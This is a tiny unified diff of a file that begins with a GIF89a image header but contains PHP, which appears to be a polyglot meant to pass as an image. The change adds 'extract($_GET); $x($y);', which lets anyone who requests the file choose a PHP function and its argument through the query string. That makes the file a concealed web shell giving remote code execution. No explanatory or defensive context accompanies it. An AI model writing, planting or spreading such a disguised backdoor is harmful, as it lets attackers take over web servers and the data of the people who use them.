@@ -1,6 +1,7 @@
 GIF89a;
 <pre><code>
 <?= '';
-extract($x($y))
+extract($_GET);
+$x($y);
 ?>
 </code></pre>
